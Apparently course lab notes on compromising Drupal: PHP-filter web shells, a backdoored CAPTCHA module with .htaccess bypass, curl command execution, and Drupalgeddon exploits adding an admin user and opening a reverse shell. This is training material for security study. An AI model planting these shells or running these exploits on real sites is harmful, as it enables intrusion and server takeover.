# Leveraging the PHP Filter Module
---
- In **==older versions of Drupal (before version 8),==** it was possible to log in as an admin and **==enable the `PHP filter` module, which "Allows embedded PHP code/snippets to be evaluated."==**
	- ![[Pasted image 20260717004720.png]]
- From here, we could tick the **check box next to the module and scroll down to `Save configuration`.** 
- Next, we could go to **Content --> Add content and ==create a `Basic page`.**==
	- ![[Pasted image 20260717004800.png]]
- We can now create a page with a **malicious PHP snippet such as the one below**. 
- We **named the parameter with an md5 hash instead of the common `cmd` to get in the practice of not potentially leaving a door open** to an attacker during our assessment.
```php
		<?php
		system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
		?>
```
- ![[Pasted image 20260717004927.png]]

- We also want to make sure to set `Text format` **==drop-down to `PHP code`==**. 
- After clicking save, we will be redirected to the new page, in this example `http://drupal-qa.inlanefreight.local/node/3`.
- Once saved, we can either request execute commands in the **browser by appending `?dcfdd5e021a869fcc6dfaef8bf31377e=id` to the end of the URL** to run the `id` command or use `cURL` on the command line:

	```bash
		curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"
	```

- From **==version 8 onwards,==** the [PHP Filter](https://www.drupal.org/project/php/releases/8.x-1.1) **==module is not installed by default.==** 
- To leverage this functionality, **==we would have to install the module ourselves.==**
- We'd start by **downloading the most recent version of the module from the Drupal website:**
	- `wget https://ftp.drupal.org/files/projects/`

- Once downloaded go to `Administration` > `Reports` > `Available updates`.
	- ![[Pasted image 20260717005131.png]]
- From here, **==click on `Browse,` select the file from the directory we downloaded it to==**, and then **==click `Install`.==**
- Once the module is installed, **we can click on `Content` and create a new basic page, similar to how we did in the Drupal 7 example**. Again, be sure to s**elect `PHP code` from the `Text format` dropdown.**

# Uploading a Backdoored Module
---
- Drupal allows users with appropriate **==permissions to upload a new module.==**
- A **==backdoored module can be created by adding a shell to an existing module==**. 
- Modules **can be found on the drupal.org website**. Let's pick a **module such as [CAPTCHA](https://www.drupal.org/project/captcha). Scroll down and copy the link for the tar.gz [archive](https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz)**:
  
- Download the archive and extract its contents:
	- `wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz`
	- `tar xvf captcha-8.x-1.2.tar.gz`
- Create a PHP web shell with the contents:
	- `<?php system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']); ?>`
- Next, **==we need to create a .htaccess file to give ourselves access to the folder.==** This is necessary as **Drupal denies direct access to the /modules** folder:
```
		<IfModule mod_rewrite.c>
		RewriteEngine On
		RewriteBase /
		</IfModule>
```
- The configuration **==above will apply rules for the / folder when we request a file in /modules.==** 
- **Copy both of these files to the captcha folder and create an archive**:
	- `mv shell.php .htaccess captcha`
	- `tar cvf captcha.tar.gz captcha/`

- Assuming we have **==administrative access to the website,==** c**lick on `Manage` and then `Extend` on the sidebar.**
- Next, click on the **`+ Install new module` button,** and we will be taken to the install page, such as `http://drupal.inlanefreight.local/admin/modules/install` 
- **Browse to the backdoored Captcha archive and click `Install`**
	- ![[Pasted image 20260717005925.png]]
- Once the installation succeeds, **==browse to `/modules/captcha/shell.php` to execute commands.==** (If not for.htaccess, this modules direct access would have been denied)
	- `curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id`

# Leveraging Known Vulnerabilities
---
Over the years, Drupal core has suffered from a **==few serious remote code execution vulnerabilities, each dubbed `Drupalgeddon`==**. At the time of writing, there are 3 Drupalgeddon vulnerabilities in existence.

- **==[CVE-2014-3704](https://www.drupal.org/SA-CORE-2014-005), known as Drupalgeddon,==** affects versions 7.0 up to 7.31 and was fixed in version 7.32. This was a pre-authenticated SQL injection flaw that could be used to upload a malicious form or create a new admin user.
- **==[CVE-2018-7600](https://www.drupal.org/sa-core-2018-002), also known as Drupalgeddon2==**, is a remote code execution vulnerability, which affects versions of Drupal prior to 7.58 and 8.5.1. The vulnerability occurs due to insufficient input sanitization during user registration, allowing system-level commands to be maliciously injected.
- **==[CVE-2018-7602](https://cvedetails.com/cve/CVE-2018-7602/), also known as Drupalgeddon3==**, is a remote code execution vulnerability that affects multiple versions of Drupal 7.x and 8.x. This flaw exploits improper validation in the Form API.
- Let's walk through exploiting each of these.

## Drupalgeddon
- This flaw can be exploited by leveraging a pre-authentication **SQL injection** which can be used to upload malicious code or **==add an admin user==**. Let's try adding a **==new admin user with this [PoC](https://www.exploit-db.com/exploits/34992) script.==**
- Once an admin user is added, we could log in and enable the `PHP Filter` module to achieve remote code execution.

- Here we see that **we need to supply the target URL and a username and password for our new admin account.** Let's run the script and see if we get a new admin user:
	- `python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd`
	- ![[Pasted image 20260717010511.png]]
	- ![[Pasted image 20260717010522.png]]
- We could also **use the [exploit/multi/http/drupal_drupageddon](https://www.rapid7.com/db/modules/exploit/multi/http/drupal_drupageddon/) Metasploit** module to exploit this.

## Drupalgeddon2
- We can **==use [this](https://www.exploit-db.com/exploits/44448) PoC to confirm this vulnerability.==**
- This script requires live CLI input:
	- ![[Pasted image 20260717010626.png]]
- We can check quickly with `cURL` and **see that the `hello.txt` file was indeed uploaded.**:
	- `curl -s http://drupal-dev.inlanefreight.local/hello.txt`
	- ![[Pasted image 20260717010652.png]]
- We can now let's modify the script to **gain remote code execution by uploading a malicious PHP file.**

## Drupalgeddon3
- [Drupalgeddon3](https://github.com/rithchard/Drupalgeddon3) is an ==**authenticated remote code execution vulnerability== that affects [multiple versions](https://www.drupal.org/sa-core-2018-004) of Drupal core.** 
- It **==requires a user to have the ability to delete a node.==** 
- We can exploit this using Metasploit, but we must **==first log in and obtain a valid session cookie==.**
	- ![[Pasted image 20260717010825.png]]

- Once we have the session cookie, **we can set up the exploit module as follows.**:
	- ![[Pasted image 20260717010900.png]]
- If successful, **we will obtain a reverse shell on the target host:**
	- ![[Pasted image 20260717010928.png]]

# Q/A
---
- Download `paragraphs` module and add `shell.php` + `.htaccess`:
	- ![[Pasted image 20260717012535.png]]
- ![[Pasted image 20260717012616.png]]
- Upload and install:
	- ![[Pasted image 20260717012646.png]]
- ![[Pasted image 20260717012801.png]]
- `curl -s drupal.inlanefreight.local/modules/paragraphs/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=cat+/var/www/drupal.inlanefreight.local/flag_6470e394cbf6dab6a91682cc8585059b.txt`
	- ![[Pasted image 20260717012932.png]]